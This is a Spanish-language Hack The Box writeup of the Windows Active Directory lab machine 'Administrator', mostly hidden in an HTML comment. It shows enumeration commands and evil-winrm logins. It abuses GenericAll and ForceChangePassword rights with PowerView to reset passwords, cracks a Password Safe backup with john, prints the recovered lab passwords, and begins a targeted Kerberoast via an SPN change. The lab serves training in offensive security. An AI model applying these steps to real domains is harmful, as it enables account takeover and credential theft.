---
description: >-
  Writeup de la máquina de dificultad media Administrator de la página https://hackthebox.eu
title: Hack The Box - Administrator | (Difficulty Medium) - Windows
date: 2025-01-29
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, active directory, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/9d60c834-3318-4bfd-910e-a6c5febfcba0
---

## Useful Skills

* Enumeración DNS (dig)
* RPC Enumeration (rpcclient)
* SMB Enumeration (netexec)
* LDAP Enumeration (netexec + ldapsearch)
* BloodHound analysis
* Abusing GenericAll permission
* Abusing Force Change Password permission
* Cracking password Backup.psafe3 (pwsafe2john)
* Abusing GenericWrite Permission
* 

> En este escenario, comenzaremos con las siguientes credenciales (usuario: olivia, contraseña: ichliebedich)
{: .prompt-info }

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.42 --ulimit 5000 -g
10.10.11.42 -> [21,53,88,135,139,389,445,464,593,9389,3268,3269,47001,49664,49665,49666,49667,49668,60306,60293,60286,60281]
```

```bash
nmap -p21,53,88,135,139,389,445,464,593,9389,3268,3269,47001,49664,49665,49666,49667,49668,60306,60293,60286,60281 -sCV 10.10.11.42 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 15:37 CET
Nmap scan report for 10.10.11.42
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-29 21:37:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
60281/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60286/tcp open  msrpc         Microsoft Windows RPC
60293/tcp open  msrpc         Microsoft Windows RPC
60306/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-01-29T21:38:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.83 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.42 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 15:39 CET
Nmap scan report for 10.10.11.42
Host is up (0.035s latency).
Not shown: 1496 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
88/udp    open   kerberos-sec
123/udp   open   ntp
21710/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

> Esta máquina sigue activa en HackTheBox. Una vez que se retire, este artículo se publicará para acceso público, de acuerdo con la política de HackTheBox sobre la publicación de contenido de su plataforma.
{: .prompt-danger }
<!--
> Hay que añadir el dominio administrator.htb en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 10.10.11.42
{: .prompt-tip }

### DNS Enumeration

Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.

```bash
dig administrator.htb@10.10.11.42 axfr

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> administrator.htb@10.10.11.42 axfr
;; global options: +cmd
; Transfer failed.
```

### SMB Enumeration

Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.

```bash
netexec smb 10.10.11.42
SMB  10.10.11.42 445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC)(domain:administrator.htb)  (signing:True)  (SMBv1:False)
```

Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB, ejecutando el comando con el usuario Olivia y la contraseña ichliebedich y así poder identificar qué recursos pueden ser accedidos. No obtengo nada interesante.

```bash
netexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 
```

### RPC Enumeration

Haciendo uso de las credenciales válidas, intento enumerar los usuarios usando la herramienta rpcclient. Obtengo con éxito los nombres de usuarios del sistema.

```bash
rpcclient -U administrator.htb/olivia%ichliebedich 10.10.11.42 -c enumdomusers | grep -oP '\[.*?\]' | tr -d '[]' | grep -v 0x
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

> Sabiendo los usuarios del sistema, una de las posibles vías de ataque a considerar sería el AS-REP Roasting
{: .prompt-tip }

### LDAP Enumeration

Utilizo NetExec para verificar si las credenciales (olivia:ichliebedich) son válidas para conectarme al servicio LDAP.

```bash
netexec ldap 10.10.11.42 -u 'olivia' -p 'ichliebedich'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\olivia:ichliebedich 
```

Haciendo uso de las credenciales válidas (olivia:ichliebedich), intento enumerar los usuarios del sistema utilizando la herramienta ldapsearch, este método es una alternativa a la enumeración de usuarios mediante rpcclient.

```bash
ldapsearch "objectclass=user" -x -H ldap://10.10.11.42 -b "dc=administrator,dc=htb" -D "olivia@administrator.htb" -w "ichliebedich" | grep sAMAccountName | cut -d : -f 2
 Administrator
 Guest
 DC$
 krbtgt
 olivia
 michael
 benjamin
 emily
 ethan
 alexander
 emma
```

## Gain access

Haciendo uso de las credenciales válidas (olivia:ichliebedich), intento verificar con NetExec si puedo acceder al sistema mediante el servicio WinRM. Obtengo un (Pwned!) lo que indica que las credenciales proporcionadas son válidas

```bash
netexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```

Accedo al sistema con evil-winrm como el usuario olivia

```bash
evil-winrm -i 10.10.11.42 -u olivia -p ichliebedich
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

## Privilege escalation

Utilizo BloodHound para identificar puntos débiles en la configuración de Active Directory que me puedan permitir escalar mis privilegios

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 07S
```

```bash
neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-01-29 16:57:42.929+0000 INFO  Starting...
2025-01-29 16:57:43.272+0000 INFO  This instance is ServerId{c79aff68} (c79aff68-d2d1-422e-b680-b0424c4ea5de)
2025-01-29 16:57:44.300+0000 INFO  ======== Neo4j 4.4.16 ========
2025-01-29 16:57:45.316+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-01-29 16:57:45.316+0000 INFO  Updating the initial password in component 'security-users'
2025-01-29 16:57:45.520+0000 INFO  Bolt enabled on localhost:7687.
2025-01-29 16:57:46.208+0000 INFO  Remote interface available at http://localhost:7474/
2025-01-29 16:57:46.212+0000 INFO  id: DFBA69E397E88AF1BC8E85BBEEFD400D7D976EDAECF75F3A77F903544778EE72
2025-01-29 16:57:46.213+0000 INFO  name: system
2025-01-29 16:57:46.213+0000 INFO  creationDate: 2025-01-29T16:57:12.71Z
2025-01-29 16:57:46.213+0000 INFO  Started.
```

En BloodHound observo que Olivia tiene permisos GenericAll sobre Michael, este permiso permite un control total sobre el objeto, por ejemplo cambiar la contraseña del usuario.

![imagen](https://github.com/user-attachments/assets/1e4b0ae8-f075-4a55-b24c-daa986bb57ed)

Descargo e importo PowerView.ps1

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> upload PowerView.ps1
                                        
Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\olivia\Documents\BloodHound\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> Import-Module .\PowerView.ps1
```

Defino la contraseña que voy a asignar el usuario michael

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

Asigno la contraseña definida $SecPassword al usuario michael

```bash
*Evil-WinRM* PS C:\Users\olivia\Documents\BloodHound> Set-DomainUserPassword -Identity michael -AccountPassword $SecPassword
```

Inicio como el usuario michael con la contraseña que he establecido en este caso Password123!

```bash
evil-winrm -i 10.10.11.42 -u michael -p 'Password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>
```

En BloodHound observo que Michael tiene el permiso Force Change Password sobre Michael, este permiso puede forzar que al otro usuario a cambiar su contraseña en el próximo inicio de sesión

![imagen](https://github.com/user-attachments/assets/7be164a7-ce08-4c35-b107-e9f26a844716)

Descargo e importo PowerView.ps1

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\michael\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module .\PowerView.ps1
```

Defino la contraseña que voy a asignar el usuario benjamin

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> $Password = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force```
```

Asigno la contraseña definida $SecPassword al usuario benjamin

```bash
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $Password
```

Observo que al intentar acceder por winrm con el usuario Benjamin no puedo, por lo que accedo por FTP con las credenciales (Benjamin:Password1234!) y observo un archivo Backup.psafe3 el cual traigo a mi máquina local.

```bash
ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:juanca): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49980|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49982|)
125 Data connection already open; Transfer starting.
100% |***************************************|   952        7.18 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (7.17 KiB/s)
```

El archivo Backup.psafe3 pertenece al gestor de contraseñas Password Safe, es un gestor de contraseñas de código abierto para el sistema operativo Windows que utiliza un cifrado AES a 256 bits.

* [Download Password Safe](https://sourceforge.net/projects/passwordsafe/)

Obtengo el hash del archivo Backup.psafe3 con pwsafe2john

```bash
pwsafe2john Backup.psafe3 > hash
```

Utilizo John The Ripper para intentar crackear la contraseña de Backup.psafe3, consigo obtener las contraseña la cual es tekieromucho

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-01-29 19:34) 3.225g/s 26425p/s 26425c/s 26425C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Abro el archivo Backup.psafe3 con el gestor de contraseñas Password Safe e introduzco la contraseña tekieromucho

![imagen](https://github.com/user-attachments/assets/7f9bdd6d-1259-41ad-97ad-1753a6ba1a75)

![imagen](https://github.com/user-attachments/assets/733fd421-aa41-4e64-b00e-8f6b38b2aa94)

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Accedo como emily al sistma con evil-winrm

```bash
evil-winrm -i 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents>
```

En BloodHound observo que Emily tiene el permiso GenericWrite sobre Ethan, este permiso puede ser explotado para actualizar atributos como permisos de cuenta, o incluso ejecutar la escalada de privilegios modificando scripts de inicio de sesión o directores de servicio.

![imagen](https://github.com/user-attachments/assets/850405bf-dddb-4e96-9a09-0055958aec32)

Descargo e importo PowerView.ps1

```bash
*Evil-WinRM* PS C:\Users\emily\Documents> upload /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1
                                        
Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\emily\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\emily\Documents> Import-Module .\PowerView.ps1
```

```bash
*Evil-WinRM* PS C:\Users\emily\Documents> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

```bash
*Evil-WinRM* PS C:\Users\emily\Documents> Set-DomainObject -Credential $Cred -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

```bash

```
-->
